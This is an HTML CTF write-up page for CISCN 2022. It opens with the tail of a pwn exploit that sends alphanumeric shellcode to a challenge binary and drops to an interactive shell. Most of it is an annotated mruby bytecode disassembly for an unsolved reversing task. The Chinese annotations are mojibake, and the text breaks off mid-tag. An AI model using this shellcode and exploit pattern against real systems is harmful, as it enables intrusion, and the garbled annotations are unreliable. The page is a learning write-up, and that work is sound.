class="string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *$rebase(0xEC9)&#x27;)</span></span><br><span class="line">io.send(<span class="string">&quot;opt:2\nmsg:&quot;</span>+shellcode+<span class="string">&quot;\n\n:2&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="baby-codeï¼ˆæœªè§£å‡º"><a href="#baby-codeï¼ˆæœªè§£å‡º" class="headerlink" title="baby_codeï¼ˆæœªè§£å‡º"></a>baby_codeï¼ˆæœªè§£å‡º</h3><p><a href="https://www.anquanke.com/post/id/253572">å…ˆæ”¾ç¯‡å¤§ä½¬çš„æ–‡ç« åœ¨è¿™é‡Œâ€”â€”mrubyå­—èŠ‚ç é€†å‘å…¥é—¨</a></p><p><a href="https://wkr.moe/ctf/787.html#Reverse">Wankko Ree ã® Blog</a></p><p><code>.mrb</code>å¯çŸ¥æ˜¯<code>mruby</code>è§£é‡Šå™¨ç”Ÿæˆçš„å­—èŠ‚ç ã€‚ä»å…¶æ–‡ä»¶å¤´å­—èŠ‚ç å¯ä»¥çœ‹å‡ºä½¿ç”¨çš„<code>mruby</code>ç‰ˆæœ¬</p><img src="https://m.360buyimg.com/babel/jfs/t1/106673/39/28401/24652/62947e45Efafd20a2/7dbea9ebee9e9003.png" style="zoom:80%;" /><p>åˆ©ç”¨<code>./mruby -v -b *.mrb  </code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/ciscn2022/mruby/mruby/bin$ ./mruby -v -b babycode.mrb </span><br><span class="line">mruby <span class="number">3.1</span><span class="number">.0</span> (<span class="number">2022</span><span class="number">-05</span><span class="number">-12</span>)</span><br><span class="line">irep <span class="number">0x18b1a90</span> nregs=<span class="number">5</span> nlocals=<span class="number">2</span> pools=<span class="number">1</span> syms=<span class="number">5</span> reps=<span class="number">2</span> ilen=<span class="number">55</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:p</span><br><span class="line">      <span class="number">000</span> LOADNILR2</span><br><span class="line">      <span class="number">002</span> LOADNILR3</span><br><span class="line">      <span class="number">004</span> CLASSR2:Crypt<span class="comment">// å®šä¹‰Cryptç±»</span></span><br><span class="line">      <span class="number">007</span> EXECR2I(<span class="number">0</span>:<span class="number">0x18b3a80</span>)<span class="comment">// æ‰§è¡Œ0x18b3a80åˆå§‹åŒ–</span></span><br><span class="line">      <span class="number">010</span> TCLASSR2</span><br><span class="line">      <span class="number">012</span> METHODR3I(<span class="number">1</span>:<span class="number">0x18b4320</span>)</span><br><span class="line">      <span class="number">015</span> DEFR2:check<span class="comment">// å¹¶æ·»ä¸Šcheckå‡½æ•°</span></span><br><span class="line">      <span class="number">018</span> SSENDR2:getsn=<span class="number">0</span><span class="comment">// getsè¾“å…¥</span></span><br><span class="line">      <span class="number">022</span> SENDR2:chompn=<span class="number">0</span></span><br><span class="line">      <span class="number">026</span> MOVER1R2; R1:p</span><br><span class="line">      <span class="number">029</span> MOVER3R1; R1:p</span><br><span class="line">      <span class="number">032</span> SSENDR2:checkn=<span class="number">1</span><span class="comment">// check(R2)æ£€æµ‹è¾“å…¥</span></span><br><span class="line">      <span class="number">036</span> JMPNOTR2<span class="number">050</span></span><br><span class="line">      <span class="number">040</span> STRINGR3L(<span class="number">0</span>); yes</span><br><span class="line">      <span class="number">043</span> SSENDR2:<span class="built_in">puts</span>n=<span class="number">1</span></span><br><span class="line">      <span class="number">047</span> JMP<span class="number">052</span></span><br><span class="line">      <span class="number">050</span> LOADNILR2</span><br><span class="line">      <span class="number">052</span> RETURNR2</span><br><span class="line">      <span class="number">054</span> STOP</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3a80</span> nregs=<span class="number">3</span> nlocals=<span class="number">1</span> pools=<span class="number">0</span> syms=<span class="number">1</span> reps=<span class="number">1</span> ilen=<span class="number">12</span></span><br><span class="line">      <span class="number">000</span> LOADNILR1</span><br><span class="line">      <span class="number">002</span> LOADNILR2</span><br><span class="line">      <span class="number">004</span> CLASSR1:CIPHER</span><br><span class="line">      <span class="number">007</span> EXECR1I(<span class="number">0</span>:<span class="number">0x18b3b50</span>)<span class="comment">// æ‰§è¡Œäº†0x18b3b50</span></span><br><span class="line">      <span class="number">010</span> RETURNR1</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3b50</span> nregs=<span class="number">3</span> nlocals=<span class="number">1</span> pools=<span class="number">0</span> syms=<span class="number">6</span> reps=<span class="number">4</span> ilen=<span class="number">55</span></span><br><span class="line">      <span class="number">000</span> LOADI32R1<span class="number">305419896</span></span><br><span class="line">      <span class="number">006</span> SETCONSTXXR1<span class="comment">// å®šä¹‰å¸¸é‡ XX=305419896</span></span><br><span class="line">      <span class="number">009</span> LOADIR1<span class="number">16</span></span><br><span class="line">      <span class="number">012</span> SETCONSTYYR1<span class="comment">// å®šä¹‰å¸¸é‡ YY=16</span></span><br><span class="line">      <span class="number">015</span> LOADSELFR1</span><br><span class="line">      <span class="number">017</span> SCLASSR1</span><br><span class="line">      <span class="number">019</span> METHODR2I(<span class="number">0</span>:<span class="number">0x18b3c60</span>)<span class="comment">// åœ¨0x18b3c60å¤„å®šä¹‰äº†encryptå‡½æ•° </span></span><br><span class="line">      <span class="number">022</span> DEFR1:encrypt</span><br><span class="line">      <span class="number">025</span> TCLASSR1</span><br><span class="line">      <span class="number">027</span> METHODR2I(<span class="number">1</span>:<span class="number">0x18b3d00</span>)<span class="comment">// åœ¨0x18b3d00å¤„ä¹Ÿå®šä¹‰äº†encryptå‡½æ•°,ä¼°è®¡é‡è½½</span></span><br><span class="line">      <span class="number">030</span> DEFR1:encrypt</span><br><span class="line">      <span class="number">033</span> SSENDR1:privaten=<span class="number">0</span></span><br><span class="line">      <span class="number">037</span> TCLASSR1</span><br><span class="line">      <span class="number">039</span> METHODR2I(<span class="number">2</span>:<span class="number">0x18b4020</span>)</span><br><span class="line">      <span class="number">042</span> DEFR1:to_key<span class="comment">// åœ¨0x18b4020å¤„å®šä¹‰äº†to_keyå‡½æ•°</span></span><br><span class="line">      <span class="number">045</span> TCLASSR1</span><br><span class="line">      <span class="number">047</span> METHODR2I(<span class="number">3</span>:<span class="number">0x18b40f0</span>)</span><br><span class="line">      <span class="number">050</span> DEFR1:enc_one<span class="comment">// åœ¨0x18b40f0å¤„å®šä¹‰äº†enc_oneå‡½æ•°</span></span><br><span class="line">      <span class="number">053</span> RETURNR1</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3c60</span> nregs=<span class="number">9</span> nlocals=<span class="number">5</span> pools=<span class="number">0</span> syms=<span class="number">3</span> reps=<span class="number">0</span> ilen=<span class="number">29</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:t</span><br><span class="line">  R2:p</span><br><span class="line">  R3:&amp;</span><br><span class="line">  R4:cip</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">2</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x80000</span>)</span><br><span class="line">      <span class="number">004</span> GETCONSTR5CIPHER</span><br><span class="line">      <span class="number">007</span> SENDR5:newn=<span class="number">0</span></span><br><span class="line">      <span class="number">011</span> MOVER4R5; R4:cip</span><br><span class="line">      <span class="number">014</span> MOVER5R4; R4:cip</span><br><span class="line">      <span class="number">017</span> MOVER6R1; R1:t</span><br><span class="line">      <span class="number">020</span> MOVER7R2; R2:p</span><br><span class="line">          <span class="comment">//ä¼ å‚ä¸ºt,p,ä¸ºå¦ä¸€ä¸ªencryptåšå‡†å¤‡</span></span><br><span class="line">      <span class="number">023</span> SENDR5:encryptn=<span class="number">2</span></span><br><span class="line">      <span class="number">027</span> RETURNR5</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3d00</span> nregs=<span class="number">16</span> nlocals=<span class="number">11</span> pools=<span class="number">1</span> syms=<span class="number">8</span> reps=<span class="number">1</span> ilen=<span class="number">346</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:t</span><br><span class="line">  R2:p</span><br><span class="line">  R3:&amp;</span><br><span class="line">  R4:key</span><br><span class="line">  R5:c</span><br><span class="line">  R6:n</span><br><span class="line">  R7:num1</span><br><span class="line">  R8:num2</span><br><span class="line">  R9:enum1</span><br><span class="line">  R10:enum2</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">2</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x80000</span>)</span><br><span class="line">      <span class="number">004</span> MOVER12R2; R2:p</span><br><span class="line">      <span class="number">007</span> SSENDR11:to_keyn=<span class="number">1</span></span><br><span class="line">      <span class="number">011</span> MOVER4R11; R4:key</span><br><span class="line">          <span class="comment">//key=to_key(p)</span></span><br><span class="line">      <span class="number">014</span> ARRAYR5R5<span class="number">0</span>; R5:c</span><br><span class="line">      <span class="number">017</span> LOADI_0R6; R6:n</span><br><span class="line">          <span class="comment">//å®šä¹‰c=[]ï¼Œn=0</span></span><br><span class="line">      <span class="number">019</span> MOVER11R6; R6:n</span><br><span class="line">      <span class="number">022</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">025</span> SENDR12:lengthn=<span class="number">0</span></span><br><span class="line">      <span class="number">029</span> LTR11R12</span><br><span class="line">      <span class="number">031</span> JMPNOTR11<span class="number">327</span></span><br><span class="line">          <span class="comment">//æ¥ç€æ˜¯ä¸€ä¸ªå¾ªç¯</span></span><br><span class="line">      <span class="number">035</span> MOVER11R1; R1:t</span><br><span class="line">      <span class="number">038</span> MOVER12R6; R6:n</span><br><span class="line">      <span class="number">041</span> GETIDXR11R12</span><br><span class="line">      <span class="number">043</span> SENDR11:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">047</span> SENDR11:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">051</span> LOADIR12<span class="number">24</span> </span><br><span class="line">      <span class="number">054</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">058</span> MOVER7R11; R7:num1</span><br><span class="line">          <span class="comment">//num1=ord(t[n])&lt;&lt;24</span></span><br><span class="line">      <span class="number">061</span> MOVER11R7; R7:num1</span><br><span class="line">      <span class="number">064</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">067</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">070</span> ADDIR13<span class="number">1</span></span><br><span class="line">      <span class="number">073</span> GETIDXR12R13</span><br><span class="line">      <span class="number">075</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">079</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">083</span> LOADIR13<span class="number">16</span></span><br><span class="line">      <span class="number">086</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">090</span> ADDR11R12</span><br><span class="line">          <span class="comment">////num1=ord(t[n+1])&lt;&lt;16</span></span><br><span class="line">      <span class="number">092</span> MOVER7R11; R7:num1</span><br><span class="line">      <span class="number">095</span> MOVER11R7; R7:num1</span><br><span class="line">      <span class="number">098</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">101</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">104</span> ADDIR13<span class="number">2</span></span><br><span class="line">      <span class="number">107</span> GETIDXR12R13</span><br><span class="line">      <span class="number">109</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">113</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">117</span> LOADIR13<span class="number">8</span></span><br><span class="line">      <span class="number">120</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">124</span> ADDR11R12</span><br><span class="line">          <span class="comment">////num1=ord(t[n+2])&lt;&lt;8</span></span><br><span class="line">      <span class="number">126</span> MOVER7R11; R7:num1</span><br><span class="line">      <span class="number">129</span> MOVER11R7; R7:num1</span><br><span class="line">      <span class="number">132</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">135</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">138</span> ADDIR13<span class="number">3</span></span><br><span class="line">      <span class="number">141</span> GETIDXR12R13</span><br><span class="line">      <span class="number">143</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">147</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">151</span> ADDR11R12</span><br><span class="line">          <span class="comment">////num1=ord(t[n+3])</span></span><br><span class="line">      <span class="number">153</span> MOVER7R11; R7:num1</span><br><span class="line">      <span class="number">156</span> MOVER11R1; R1:t</span><br><span class="line">      <span class="number">159</span> MOVER12R6; R6:n</span><br><span class="line">      <span class="number">162</span> ADDIR12<span class="number">4</span></span><br><span class="line">      <span class="number">165</span> GETIDXR11R12</span><br><span class="line">      <span class="number">167</span> SENDR11:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">171</span> SENDR11:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">175</span> LOADIR12<span class="number">24</span></span><br><span class="line">      <span class="number">178</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">182</span> MOVER8R11; R8:num2</span><br><span class="line">          <span class="comment">//num2=ord(t[n+4])&lt;&lt;24</span></span><br><span class="line">      <span class="number">185</span> MOVER11R8; R8:num2</span><br><span class="line">      <span class="number">188</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">191</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">194</span> ADDIR13<span class="number">5</span></span><br><span class="line">      <span class="number">197</span> GETIDXR12R13</span><br><span class="line">      <span class="number">199</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">203</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">207</span> LOADIR13<span class="number">16</span></span><br><span class="line">      <span class="number">210</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">214</span> ADDR11R12</span><br><span class="line">          <span class="comment">//num2+=ord(t[n+5])&lt;&lt;16</span></span><br><span class="line">      <span class="number">216</span> MOVER8R11; R8:num2</span><br><span class="line">      <span class="number">219</span> MOVER11R8; R8:num2</span><br><span class="line">      <span class="number">222</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">225</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">228</span> ADDIR13<span class="number">6</span></span><br><span class="line">      <span class="number">231</span> GETIDXR12R13</span><br><span class="line">      <span class="number">233</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">237</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">241</span> LOADIR13<span class="number">8</span></span><br><span class="line">      <span class="number">244</span> SENDR12:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">      <span class="number">248</span> ADDR11R12</span><br><span class="line">          <span class="comment">//num2=ord(t[n+6])&lt;&lt;8</span></span><br><span class="line">      <span class="number">250</span> MOVER8R11; R8:num2</span><br><span class="line">      <span class="number">253</span> MOVER11R8; R8:num2</span><br><span class="line">      <span class="number">256</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">259</span> MOVER13R6; R6:n</span><br><span class="line">      <span class="number">262</span> ADDIR13<span class="number">7</span></span><br><span class="line">      <span class="number">265</span> GETIDXR12R13</span><br><span class="line">      <span class="number">267</span> SENDR12:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">271</span> SENDR12:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">275</span> ADDR11R12</span><br><span class="line">          <span class="comment">//num2=ord(t[n+7])</span></span><br><span class="line">      <span class="number">277</span> MOVER8R11; R8:num2</span><br><span class="line">      <span class="number">280</span> MOVER12R7; R7:num1</span><br><span class="line">      <span class="number">283</span> MOVER13R8; R8:num2</span><br><span class="line">      <span class="number">286</span> MOVER14R4; R4:key</span><br><span class="line">      <span class="number">289</span> SSENDR11:enc_onen=<span class="number">3</span></span><br><span class="line">      <span class="number">293</span> AREFR9R11<span class="number">0</span>; R9:enum1</span><br><span class="line">      <span class="number">297</span> AREFR10R11<span class="number">1</span>; R10:enum2</span><br><span class="line">          <span class="comment">//enum1,enum2=enc_one(num1,num2,key)</span></span><br><span class="line">      <span class="number">301</span> MOVER11R5; R5:c</span><br><span class="line">      <span class="number">304</span> MOVER12R9; R9:enum1</span><br><span class="line">      <span class="number">307</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//c.append(enum1)</span></span><br><span class="line">      <span class="number">311</span> MOVER11R5; R5:c</span><br><span class="line">      <span class="number">314</span> MOVER12R10; R10:enum2</span><br><span class="line">      <span class="number">317</span> SENDR11:&lt;&lt;n=<span class="number">1</span></span><br><span class="line">          <span class="comment">//c.append(enum2)</span></span><br><span class="line">      <span class="number">321</span> ADDIR6<span class="number">8</span>; R6:n</span><br><span class="line">      <span class="number">324</span> JMP<span class="number">019</span></span><br><span class="line">          <span class="comment">//æ­¥é•¿ä¸º8çš„å¾ªç¯</span></span><br><span class="line">      <span class="number">327</span> MOVER11R5; R5:c</span><br><span class="line">      <span class="number">330</span> BLOCKR12<span class="title function_">I</span><span class="params">(<span class="number">0</span>:<span class="number">0x18b3f50</span>)</span></span><br><span class="line">      333 SENDBR11:collectn=<span class="number">0</span></span><br><span class="line">      <span class="number">337</span> STRINGR12<span class="title function_">L</span><span class="params">(<span class="number">0</span>)</span>; </span><br><span class="line">      <span class="number">340</span> SENDR11:joinn=<span class="number">1</span></span><br><span class="line">          <span class="comment">//è°ƒç”¨&quot;&quot;.join(c.collect(0x18b3f50))</span></span><br><span class="line">      <span class="number">344</span> RETURNR11</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3f50</span> nregs=<span class="number">7</span> nlocals=<span class="number">3</span> pools=<span class="number">1</span> syms=<span class="number">1</span> reps=<span class="number">0</span> ilen=<span class="number">16</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:x</span><br><span class="line">  R2:&amp;</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> STRINGR4L(<span class="number">0</span>); %<span class="number">.8</span>x</span><br><span class="line">      <span class="number">007</span> MOVER5R1; R1:x</span><br><span class="line">      <span class="number">010</span> SSENDR3:<span class="built_in">sprintf</span>n=<span class="number">2</span></span><br><span class="line">          <span class="comment">//è¿›åˆ¶è½¬æ¢</span></span><br><span class="line">      <span class="number">014</span> RETURNR3</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b4020</span> nregs=<span class="number">6</span> nlocals=<span class="number">3</span> pools=<span class="number">1</span> syms=<span class="number">1</span> reps=<span class="number">0</span> ilen=<span class="number">16</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:p</span><br><span class="line">  R2:&amp;</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">1</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x40000</span>)</span><br><span class="line">      <span class="number">004</span> MOVER3R1; R1:p</span><br><span class="line">      <span class="number">007</span> STRINGR4<span class="title function_">L</span><span class="params">(<span class="number">0</span>)</span>; L*</span><br><span class="line">      <span class="number">010</span> SENDR3:unpackn=<span class="number">1</span></span><br><span class="line">          <span class="comment">//æ¯å››ä¸ªå­—èŠ‚è½¬æˆä¸€ä¸ªæ•´æ•°</span></span><br><span class="line">      <span class="number">014</span> RETURNR3</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b40f0</span> nregs=<span class="number">11</span> nlocals=<span class="number">8</span> pools=<span class="number">0</span> syms=<span class="number">2</span> reps=<span class="number">1</span> ilen=<span class="number">42</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:num1</span><br><span class="line">  R2:num2</span><br><span class="line">  R3:key</span><br><span class="line">  R4:&amp;</span><br><span class="line">  R5:y</span><br><span class="line">  R6:z</span><br><span class="line">  R7:s</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">3</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0xc0000</span>)</span><br><span class="line">      <span class="number">004</span> MOVER8R1; R1:num1</span><br><span class="line">      <span class="number">007</span> MOVER9R2; R2:num2</span><br><span class="line">      <span class="number">010</span> LOADI_0R10</span><br><span class="line">      <span class="number">012</span> MOVER5R8; R5:y</span><br><span class="line">      <span class="number">015</span> MOVER6R9; R6:z</span><br><span class="line">      <span class="number">018</span> MOVER7R10; R7:s</span><br><span class="line">      <span class="number">021</span> GETCONSTR8YY</span><br><span class="line">      <span class="number">024</span> BLOCKR9<span 